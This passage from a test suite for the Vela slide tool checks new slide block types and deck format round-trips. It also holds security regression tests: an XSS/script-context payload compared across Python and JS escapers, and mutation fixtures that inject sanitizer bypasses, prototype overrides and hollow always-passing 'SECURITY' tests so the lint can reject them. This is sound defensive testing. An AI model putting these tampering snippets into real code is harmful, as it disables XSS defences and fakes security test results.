    print("\n── Block Primitives Tests ──")

    NEW_BLOCKS = ["comparison", "funnel", "cycle", "number-row", "matrix", "checklist"]

    # 1. All new types in SAFE_BLOCK_TYPES (part-imports.jsx)
    imports_src = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
    for bt in NEW_BLOCKS:
        if f'"{bt}"' in imports_src and "SAFE_BLOCK_TYPES" in imports_src:
            ok(f'"{bt}" in SAFE_BLOCK_TYPES')
        else:
            fail(f'"{bt}" in SAFE_BLOCK_TYPES')

    # 2. All new types in VALID_BLOCK_TYPES (validate.py)
    validate_src = open(os.path.join(SCRIPTS, "validate.py"), encoding="utf-8").read()
    for bt in NEW_BLOCKS:
        if f'"{bt}"' in validate_src:
            ok(f'"{bt}" in VALID_BLOCK_TYPES')
        else:
            fail(f'"{bt}" in VALID_BLOCK_TYPES')

    # 3. All new types have renderers in part-blocks.jsx
    blocks_src = open(os.path.join(PARTS_DIR, "part-blocks.jsx"), encoding="utf-8").read()
    for bt in NEW_BLOCKS:
        if f'case "{bt}"' in blocks_src:
            ok(f'Renderer for "{bt}" in part-blocks.jsx')
        else:
            fail(f'Renderer for "{bt}" in part-blocks.jsx')

    # 4. Block schema reference documents all new types
    schema_path = os.path.join(SKILL_DIR, "references", "block-schema.md")
    schema_src = open(schema_path, encoding="utf-8").read()
    for bt in NEW_BLOCKS:
        if f"### {bt}" in schema_src:
            ok(f'block-schema.md documents "{bt}"')
        else:
            fail(f'block-schema.md documents "{bt}"')

    # 5. SKILL.md mentions all new types
    skill_src = open(os.path.join(SKILL_DIR, "SKILL.md"), encoding="utf-8").read()
    for bt in NEW_BLOCKS:
        if bt in skill_src:
            ok(f'SKILL.md mentions "{bt}"')
        else:
            fail(f'SKILL.md mentions "{bt}"')

    # 6. Turbo format has type IDs for all new types
    vela_src = open(os.path.join(SCRIPTS, "vela.py"), encoding="utf-8").read()
    for bt in NEW_BLOCKS:
        if f'"{bt}":' in vela_src and "_BLOCK_TYPE_IDS" in vela_src:
            ok(f'Turbo type ID for "{bt}"')
        else:
            fail(f'Turbo type ID for "{bt}"')

    # 7. Compact format key mappings for new block properties
    new_keys = ["dividerLabel", "centerLabel", "centerSub", "quadrants", "xLeft", "xRight", "yTop", "yBottom"]
    for key in new_keys:
        if f'"{key}"' in vela_src:
            ok(f'Compact key mapping for "{key}"')
        else:
            fail(f'Compact key mapping for "{key}"')

    # 8. Sanitization handles new types (comparison/matrix have nested items)
    if "comparison" in imports_src and "matrix" in imports_src:
        if 'clean.type === "comparison"' in imports_src and 'clean.type === "matrix"' in imports_src:
            ok("Sanitization handles comparison/matrix nested items")
        else:
            fail("Sanitization for comparison/matrix")

    if 'clean.type === "funnel"' in imports_src or '"funnel"' in imports_src.split("SAFE_BLOCK_TYPES")[1].split("sanitizeBlock")[0] if "sanitizeBlock" in imports_src else True:
        # funnel/cycle/number-row/checklist use same sanitization as flow/steps/timeline
        sanitize_line = imports_src[imports_src.index("sanitizeBlock"):] if "sanitizeBlock" in imports_src else ""
        if "funnel" in sanitize_line and "cycle" in sanitize_line and "number-row" in sanitize_line and "checklist" in sanitize_line:
            ok("Sanitization includes funnel/cycle/number-row/checklist")
        else:
            fail("Sanitization for funnel/cycle/number-row/checklist")

    # 9. Validate demo deck with new blocks passes
    starter = os.path.join(EXAMPLES, "vela-demo.vela")
    result = subprocess.run(
        [sys.executable, os.path.join(SCRIPTS, "validate.py"), starter],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        ok("vela-demo.vela validates with new block types")
    else:
        fail("vela-demo.vela validation", result.stdout + result.stderr)

    # 10. Demo deck contains all 6 new block types
    deck = json.load(open(starter, encoding="utf-8"))
    all_types = set()
    def _collect_block_types(obj):
        if isinstance(obj, dict):
            if "type" in obj:
                all_types.add(obj["type"])
            for v in obj.values():
                _collect_block_types(v)
        elif isinstance(obj, list):
            for v in obj:
                _collect_block_types(v)
    _collect_block_types(deck)
    for bt in NEW_BLOCKS:
        if bt in all_types:
            ok(f'vela-demo.vela has "{bt}" block')
        else:
            fail(f'vela-demo.vela has "{bt}" block')

    # 11. Compact round-trip: compact and expand a deck with new blocks
    vela_py = os.path.join(SCRIPTS, "vela.py")
    tmpdir = tempfile.mkdtemp(prefix="vela-block-test-")
    try:
        test_deck = {
            "deckTitle": "Block Primitives Test",
            "lanes": [{"title": "Test", "items": [{
                "title": "New Blocks",
                "status": "done",
                "slides": [
                    {"bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6", "duration": 60,
                     "blocks": [
                        {"type": "comparison", "items": [
                            {"title": "A", "color": "#ef4444", "items": ["Point 1"]},
                            {"title": "B", "color": "#22c55e", "items": ["Point 2"]}
                        ], "dividerLabel": "VS"},
                        {"type": "funnel", "items": [
                            {"label": "Top", "value": "100", "color": "#3b82f6"},
                            {"label": "Bottom", "value": "10", "color": "#ef4444", "drop": "-90%", "highlight": True}
                        ]},
                        {"type": "cycle", "centerLabel": "Loop", "items": [
                            {"label": "A", "color": "#3b82f6"},
                            {"label": "B", "color": "#22c55e"},
                            {"label": "C", "color": "#f97316"}
                        ]},
                        {"type": "number-row", "items": [
                            {"value": "99%", "label": "Uptime", "icon": "Activity", "color": "#22c55e"},
                            {"value": "42ms", "label": "Latency", "color": "#3b82f6"}
                        ]},
                        {"type": "matrix", "xLeft": "X", "xRight": "Y", "quadrants": [
                            {"title": "Q1", "color": "#22c55e", "items": ["A"]},
                            {"title": "Q2", "color": "#3b82f6", "items": ["B"]},
                            {"title": "Q3", "color": "#f97316", "items": ["C"]},
                            {"title": "Q4", "color": "#ef4444", "items": ["D"]}
                        ]},
                        {"type": "checklist", "items": [
                            {"text": "Done item", "status": "done"},
                            {"text": "Partial item", "status": "partial"},
                            {"text": "Pending item", "status": "pending"},
                            {"text": "Blocked item", "status": "blocked"}
                        ]}
                    ]},
                ]
            }]}]
        }

        deck_path = os.path.join(tmpdir, "test.vela")
        compact_path = os.path.join(tmpdir, "compact.vela")
        expanded_path = os.path.join(tmpdir, "expanded.vela")
        turbo_path = os.path.join(tmpdir, "turbo.vela")

        with open(deck_path, "w", encoding="utf-8") as f:
            json.dump(test_deck, f, ensure_ascii=False)

        # Compact round-trip
        r = subprocess.run([sys.executable, vela_py, "deck", "compact", deck_path, compact_path],
                           capture_output=True, text=True)
        if r.returncode == 0 and os.path.exists(compact_path):
            ok("deck compact succeeds with new block types")
            compact = json.load(open(compact_path, encoding="utf-8"))
            if "S" in compact or "G" in compact:
                ok("Compact output uses short keys")
            else:
                fail("Compact format structure")

            # Expand back
            r2 = subprocess.run([sys.executable, vela_py, "deck", "expand", compact_path, expanded_path],
                                capture_output=True, text=True)
            if r2.returncode == 0 and os.path.exists(expanded_path):
                expanded = json.load(open(expanded_path, encoding="utf-8"))
                # Check all block types survive round-trip
                rt_types = set()
                for lane in expanded.get("lanes", []):
                    for item in lane.get("items", []):
                        for slide in item.get("slides", []):
                            for block in slide.get("blocks", []):
                                rt_types.add(block.get("type"))
                missing = [bt for bt in NEW_BLOCKS if bt not in rt_types]
                if not missing:
                    ok("Compact round-trip preserves all 6 new block types")
                else:
                    fail("Compact round-trip", f"missing: {missing}")
            else:
                fail("deck expand", r2.stdout + r2.stderr)
        else:
            fail("deck compact", r.stdout + r.stderr)

        # Turbo round-trip
        r = subprocess.run([sys.executable, vela_py, "deck", "turbo", deck_path, turbo_path],
                           capture_output=True, text=True)
        if r.returncode == 0 and os.path.exists(turbo_path):
            ok("deck turbo succeeds with new block types")

            # Expand turbo back
            r2 = subprocess.run([sys.executable, vela_py, "deck", "expand", turbo_path, expanded_path],
                                capture_output=True, text=True)
            if r2.returncode == 0 and os.path.exists(expanded_path):
                expanded = json.load(open(expanded_path, encoding="utf-8"))
                rt_types = set()
                for lane in expanded.get("lanes", []):
                    for item in lane.get("items", []):
                        for slide in item.get("slides", []):
                            for block in slide.get("blocks", []):
                                rt_types.add(block.get("type"))
                missing = [bt for bt in NEW_BLOCKS if bt not in rt_types]
                if not missing:
                    ok("Turbo round-trip preserves all 6 new block types")
                else:
                    fail("Turbo round-trip", f"missing: {missing}")
            else:
                fail("turbo expand", r2.stdout + r2.stderr)
        else:
            fail("deck turbo", r.stdout + r.stderr)

        # Validate the test deck
        r = subprocess.run([sys.executable, os.path.join(SCRIPTS, "validate.py"), deck_path],
                           capture_output=True, text=True)
        if r.returncode == 0:
            ok("Test deck with all new blocks validates")
        else:
            fail("Test deck validation", r.stdout + r.stderr)

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ━━━ Script-Context Injection Parity (Phase 5) ━━━━━━━━━━━━━━━━━━━

def test_script_context_escape_parity():
    """Phase 5 (script-context injection parity):

    1. The Python helper (assemble.py:escape_for_script_context) and the ONE
       canonical JS implementation (vela-neutralino/resources/js/script-escape.js)
       must escape a hostile payload — <, >, &, $', $`, $&, U+2028, U+2029,
       </script> — identically. The JS file is exercised through BOTH loader
       shapes it supports: Node `require()` (render-offline.js call sites) and
       classic-<script> global attachment with no `module`/`require` in scope
       (the nl-boot.js webview call site).
    2. Every JS call site that splices STARTUP_PATCH into source text
       (nl-boot.js, tools/vela-dev/scripts/render-offline.js, and the sibling
       .hyper-sprint/render-offline.js if present) must use the replacer-
       FUNCTION form of `.replace()` — a plain-string replacement lets deck
       content contain $&/$`/$'-style backreferences that splice adjacent
       template bytes into the injected value.
    """
    print("\n── Script-Context Escape Parity (Phase 5) ──")

    script_escape_js = os.path.join(REPO_ROOT, "vela-neutralino", "resources", "js", "script-escape.js")
    nl_boot_js = os.path.join(REPO_ROOT, "vela-neutralino", "resources", "js", "nl-boot.js")
    render_offline_js = os.path.join(DEV_SCRIPTS, "render-offline.js")
    hyper_sprint_render_offline_js = os.path.join(REPO_ROOT, ".hyper-sprint", "render-offline.js")

    if not os.path.exists(script_escape_js):
        fail("script-escape.js exists", f"missing: {script_escape_js}")
        return

    # Payload deliberately includes every char class the escaper must handle,
    # plus the $-pattern tokens that only the replacer-function form (not the
    # escaper) neutralizes.
    payload = "<>&$'$`$&  </script>"

    sys.path.insert(0, SCRIPTS)
    try:
        from assemble import escape_for_script_context
    except Exception as e:
        fail("Import assemble.escape_for_script_context", str(e))
        return

    py_json = json.dumps(payload, ensure_ascii=False)
    py_escaped = escape_for_script_context(py_json)

    node_probe = r'''
const fs = require("fs");
const vm = require("vm");
const filePath = process.argv[1];
const jsonStr = process.argv[2];

// (a) Node CommonJS require() path — used by render-offline.js.
const { escapeForScriptContext: viaRequire } = require(filePath);

// (b) classic-<script> global-attachment path — used by nl-boot.js. Runs the
// SAME source with no `module`/`require`/`exports` in scope, exactly like a
// plain non-module <script src> tag in index.html.
const src = fs.readFileSync(filePath, "utf8");
const sandbox = {};
vm.createContext(sandbox);
vm.runInContext(src, sandbox);
const viaGlobal = sandbox.escapeForScriptContext;

process.stdout.write(JSON.stringify({
  viaRequire: viaRequire(jsonStr),
  viaGlobal: typeof viaGlobal === "function" ? viaGlobal(jsonStr) : null,
}));
'''
    try:
        r = subprocess.run(
            ["node", "-e", node_probe, "--", script_escape_js, py_json],
            capture_output=True, text=True, timeout=30,
        )
    except FileNotFoundError:
        skip("Script-context escape parity", "node not on PATH")
        return
    except subprocess.TimeoutExpired:
        fail("Script-context escape parity", "node probe timeout after 30s")
        return

    if r.returncode != 0:
        fail("script-escape.js loads under Node (both loader shapes)", r.stdout + r.stderr)
        return

    try:
        js_out = json.loads(r.stdout)
    except Exception as e:
        fail("Parse script-escape.js probe output", f"{e}: {r.stdout!r}")
        return

    if js_out.get("viaRequire") == py_escaped:
        ok("JS require() path == Python escape_for_script_context() (identical on hostile payload)")
    else:
        fail("JS require() path parity", f"py={py_escaped!r} js={js_out.get('viaRequire')!r}")

    if js_out.get("viaGlobal") == py_escaped:
        ok("JS classic-<script> global path == Python escape_for_script_context() (identical on hostile payload)")
    else:
        fail("JS classic-<script> global path parity", f"py={py_escaped!r} js={js_out.get('viaGlobal')!r}")

    # Source-level: every call site must use the replacer-FUNCTION form —
    # `.replace(marker, () => ...)` — not a plain-string replacement.
    replacer_fn_re = re.compile(r"\.replace\(\s*marker\s*,\s*\(\s*\)\s*=>")

    sites = [
        ("nl-boot.js", nl_boot_js),
        ("tools/vela-dev/scripts/render-offline.js", render_offline_js),
    ]
    if os.path.exists(hyper_sprint_render_offline_js):
        sites.append((".hyper-sprint/render-offline.js", hyper_sprint_render_offline_js))
    else:
        skip(".hyper-sprint/render-offline.js replacer-function form", "file not present in this tree")

    for label, filepath in sites:
        if not os.path.exists(filepath):
            fail(f"{label} exists", f"missing: {filepath}")
            continue
        with open(filepath, "r", encoding="utf-8") as f:
            src = f.read()
        if replacer_fn_re.search(src):
            ok(f"{label} uses replacer-function form for STARTUP_PATCH injection")
        else:
            fail(f"{label} replacer-function form",
                 "expected `.replace(marker, () => ...)` — plain-string replacement "
                 "lets deck content splice via $&/$`/$' backreferences")
        # Every call site must delegate to the shared escaper, not a private copy.
        if "escapeForScriptContext(" in src:
            ok(f"{label} calls the shared escapeForScriptContext()")
        else:
            fail(f"{label} shared escaper usage",
                 "expected a call to escapeForScriptContext() instead of an inline escape chain")


def test_svg_style_recurrence_guards():
    """The SVG-<style> UI-integrity recurrence guards (lint + runtime) must be
    load-bearing: reject re-admission / skip-dodge idioms and NOT false-positive on
    clean code. (Round-3/4 adversarial finding: the guards had no self-test.)"""
    print("\n🛡️  SVG-<style> recurrence guards")
    lint = os.path.join(DEV_SCRIPTS, "lint.py")

    def lint_clean(parts_dir):
        r = subprocess.run([sys.executable, lint, "--parts", parts_dir],
                           capture_output=True, text=True, timeout=90)
        return r.returncode == 0

    if lint_clean(PARTS_DIR):
        ok("recurrence guards: real src/parts lints clean (no false positive)")
    else:
        fail("recurrence guards: real src/parts must lint clean")

    # Each idiom is (file, needle_or_None, replacement, label). needle=None => append.
    idioms = [
        ("part-imports.jsx", '  "image",  // href/xlink:href pass scheme allowlist',
         '  "image",  // href/xlink:href pass scheme allowlist\n  "style",', "literal <style> re-admit"),
        ("part-imports.jsx", 'const SVG_URL_REF_ATTRS',
         'const _SAT = SVG_ALLOWED_TAGS;\n_SAT.has = (t) => t === "sty" + "le";\nconst SVG_URL_REF_ATTRS',
         "aliased .has membership override (part-imports)"),
        # Gap A: the tamper can live in ANY part-file (one module scope in the monolith).
        ("part-app.jsx", None,
         '\nconst _XSAT = SVG_ALLOWED_TAGS;\n_XSAT.has = (t) => t === "sty" + "le";\n',
         "cross-part aliased .has override (part-app)"),
        ("part-app.jsx", None,
         '\nSet.prototype.has = function () { return true; };\n', "cross-part Set.prototype patch"),
        ("part-uitest2.jsx", 'cannot restyle/relocate app chrome (S16/S17 redress+clickjack)", fn:',
         'cannot restyle/relocate app chrome (S16/S17 redress+clickjack)", /*fn:*/ requiresAI: true, fn:',
         "requiresAI skip-dodge on flagship security test"),
        # Gap B: a vacuous security-named test (no sanitizeSvgMarkup call) neuters the guard.
        ("part-uitest2.jsx", None,
         '\nconst _bogusSecTest = { name: "SECURITY: bogus <style> vacuous", fn: async () => { return true; } };\n',
         "vacuous security test (no sanitizeSvgMarkup call)"),
        # R6B: a built-in prototype override the sanitizer's tag lookup trusts.
        ("part-app.jsx", None,
         '\nString.prototype.toLowerCase = function () { return "g"; };\n',
         "built-in prototype override (toLowerCase)"),
        ("part-app.jsx", None,
         '\nObject.defineProperty(Element.prototype, "localName", { get() { return "g"; } });\n',
         "defineProperty on Element.prototype (localName getter)"),
        # R6C: tamper in part-pptx.jsx (formerly missing from the scan list).
        ("part-pptx.jsx", None,
         '\nconst _PP = SVG_ALLOWED_TAGS; _PP.has = (t) => t === "style";\n',
         "cross-part tamper in part-pptx.jsx"),
        # R6B: a chrome-safety test that calls the sanitizer but drops its assertion.
        ("part-uitest2.jsx", None,
         '\nconst _neuter = { name: "SECURITY: overlay app chrome bogus", fn: async () => { sanitizeSvgMarkup("<rect/>"); return true; } };\n',
         "neutered chrome-safety test (calls sanitizer, no computed-style assertion)"),
        # R7B/R7C: keeps the required tokens as DEAD code but hardcodes the result.
        ("part-uitest2.jsx", None,
         '\nconst _dead = { name: "SECURITY: overlay app chrome deadcode", fn: async () => { const h = document.createElement("div"); sanitizeSvgMarkup("<rect/>"); getComputedStyle(h); return true; } };\n',
         "dead-code-token neuter (getComputedStyle present but return true)"),
    ]
    for fname, needle, repl, label in idioms:
        tmp = tempfile.mkdtemp()
        try:
            dst = os.path.join(tmp, "parts")
            shutil.copytree(PARTS_DIR, dst)
            fp = os.path.join(dst, fname)
            with open(fp, encoding="utf-8") as f:
                s = f.read()
            if needle is None:
                mutated = s + repl
            elif needle in s:
                mutated = s.replace(needle, repl, 1)
            else:
                fail(f"recurrence guards: fixture needle missing for '{label}'")
                continue
            with open(fp, "w", encoding="utf-8") as f:
                f.write(mutated)
            if not lint_clean(dst):
                ok(f"recurrence guards: lint rejects {label}")
            else:
                fail(f"recurrence guards: lint MUST reject {label}")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    # R7B: a decoy sanitizer (a clean copy — even inside a /* */ comment — so a
    # first-match extraction tests it while the real one re-admits <style>) must make
    # the node sanitizer suite FAIL via its exactly-one-definition check.
    mxss = os.path.join(REPO_ROOT, "tests", "test_svg_mxss.cjs")
    tmp = tempfile.mkdtemp()
    try:
        with open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8") as f:
            s = f.read()
        decoy = "/* decoy\nfunction sanitizeSvgMarkup(raw) { return raw; }\n*/\n"
        fake = os.path.join(tmp, "pi.jsx")
        with open(fake, "w", encoding="utf-8") as f:
            f.write(s.replace("function sanitizeSvgMarkup(raw) {", decoy + "function sanitizeSvgMarkup(raw) {", 1))
        env = os.environ.copy()
        env["NODE_PATH"] = os.pathsep.join(filter(None, [
            env.get("NODE_PATH", ""), os.path.join(REPO_ROOT, "node_modules"), "/tmp/node_modules"]))
        try:
            # Pass the decoy copy as an explicit CLI arg (not an env var) — the real
            # CI-gating invocation elsewhere passes no arg and always reads the real file.
            r = subprocess.run(["node", mxss, fake], capture_output=True, text=True, timeout=60, env=env)
            if r.returncode == 2:
                skip("recurrence guards: node decoy check", "jsdom not installed")
            elif r.returncode != 0:
                ok("recurrence guards: node sanitizer suite rejects a decoy sanitizer definition")
            else:
                fail("recurrence guards: node suite MUST reject a decoy sanitizer (exactly-one check)")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            skip("recurrence guards: node decoy check", "node unavailable")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    # Runtime / value pieces the lint can't behaviourally test — assert present in source.
    with open(os.path.join(PARTS_DIR, "part-uitest.jsx"), encoding="utf-8") as f:
        ut = f.read()
    if "security test must not be requiresAI-skippable" in ut:
        ok("recurrence guards: runner fails a requiresAI-skipped security test at runtime")
    else:
        fail("recurrence guards: runner must fail a requiresAI-skipped security test")
    with open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8") as f:
        pi = f.read()
    if "position|top|left|right|bottom|inset" in pi and "pointer-events" in pi:
        ok("recurrence guards: SVG inline-style layout/position denylist present")
    else:
        fail("recurrence guards: SVG inline-style layout/position denylist missing")


if __name__ == "__main__":
    args = sys.argv[1:]
    run_all = "--all" in args
    run_unit = "--unit" in args or (not args) or run_all
    run_integration = "--integration" in args or (not args) or run_all

    print("⛵ Vela Slides Test Suite\n")

    if run_unit:
        test_unit()
        test_security()
        test_css_color_exfil()
        test_audit_2025_05_fixes()
        test_known_bugs()
        test_editor_ux_bugs()
        test_slide_editor_ux_features()
        test_toc_nav_and_gallery_titlecards()
        test_ip_hygiene()
        test_v10_features()
        test_channel_local()
        test_server_hardening()
        test_block_primitives()
        test_study_notes()
        test_slide_numeric_fields()
        test_deck_key_allowlist_structure()
        test_pdf_title_cards()
        test_script_context_escape_parity()
        test_svg_style_recurrence_guards()
    if run_integration:
        test_integration()
        test_cli_commands()
        test_serve_auth()

    extra_fails = 0
    if run_all:
        extra_fails += run_server_tests()
        extra_fails += run_concat_sync()
        extra_fails += run_e2e_tests()
        extra_fails += run_pptx_e2e_tests()

    total_fails = fails + (1 if extra_fails else 0)

    print(f"\n{'━' * 40}")
    print(f"  ✅ {passes} passed  {(str(skips) + ' skipped  ') if skips else ''}{'❌ ' + str(fails) + ' failed' if fails else ''}")
    if run_all and extra_fails:
        print(f"  ❌ External test suites had failures")
    print(f"{'━' * 40}")

    sys.exit(1 if total_fails else 0)
